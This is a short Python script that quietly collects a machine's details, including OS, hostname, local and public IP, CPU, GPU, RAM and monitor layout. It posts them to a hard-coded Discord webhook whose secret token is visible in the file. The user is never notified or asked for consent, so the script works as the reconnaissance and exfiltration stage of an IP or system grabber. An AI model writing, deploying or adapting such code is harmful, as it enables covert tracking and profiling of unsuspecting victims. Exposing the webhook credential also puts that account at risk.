import platform
import requests
import socket
from cpuinfo import get_cpu_info
import psutil
from screeninfo import get_monitors
import subprocess

# Replace with your Discord webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1320641725034926133/l1Y2_9bYYvtluQR4Io67E96ubDUT_x9wGDOHHtYz0GifdZOfGNq0Su2AqPji3ttuIWj8"

def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org?format=json")
        response.raise_for_status()
        return response.json().get("ip")
    except requests.RequestException as e:
        return f"Error fetching IP: {e}"

def get_gpu_info():
    gpu_details = []

    try:
        # Attempt to detect discrete GPUs using GPUtil
        import GPUtil
        gpus = GPUtil.getGPUs()
        if gpus:
            gpu_details = [f"{gpu.name} (Total Memory: {gpu.memoryTotal}MB)" for gpu in gpus]

    except Exception:
        pass  # GPUtil may not work on all systems

    try:
        # Fall back to detecting integrated GPUs or other GPUs using DirectX diagnostics
        if not gpu_details:
            result = subprocess.run(
                ["dxdiag", "/t", "dxdiag.txt"], capture_output=True, text=True
            )
            with open("dxdiag.txt", "r") as file:
                for line in file.readlines():
                    if "Card name" in line:
                        gpu_details.append(line.split(":")[1].strip())
    except Exception:
        pass  # Ignore errors in fallback method

    return "; ".join(gpu_details) if gpu_details else "No GPU Detected"

def get_machine_info():
    try:
        # CPU Info
        cpu_info = get_cpu_info()
        
        # GPU Info
        gpu_info = get_gpu_info()
        
        # RAM Info
        ram = psutil.virtual_memory()
        ram_total_gb = round(ram.total / (1024**3), 2)  # Convert to GB
        
        # Monitor Info
        monitors = get_monitors()
        monitor_details = [
            f"Monitor {idx + 1}: {monitor.width}x{monitor.height} @ {monitor.width_mm}x{monitor.height_mm} mm"
            for idx, monitor in enumerate(monitors)
        ]
        
        return {
            "OS": platform.system(),
            "OS Version": platform.version(),
            "Machine Name": platform.node(),
            "CPU": cpu_info.get("brand_raw", "Unknown CPU"),
            "Architecture": platform.architecture()[0],
            "Hostname": socket.gethostname(),
            "IP Address": socket.gethostbyname(socket.gethostname()),
            "RAM": f"{ram_total_gb} GB",
            "GPUs": gpu_info,
            "Monitors": "; ".join(monitor_details) if monitor_details else "No Monitor Detected",
        }
    except Exception as e:
        return {"Error": f"Failed to retrieve machine info: {e}"}

def send_to_discord(machine_info, public_ip):
    try:
        content = f"**Machine Info:**\n"
        for key, value in machine_info.items():
            content += f"{key}: {value}\n"
        content += f"**Public IP:** {public_ip}"
        payload = {"content": content}
        response = requests.post(WEBHOOK_URL, json=payload)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Failed to send to Discord: {e}")

if __name__ == "__main__":
    public_ip = get_public_ip()
    machine_info = get_machine_info()
    send_to_discord(machine_info, public_ip)
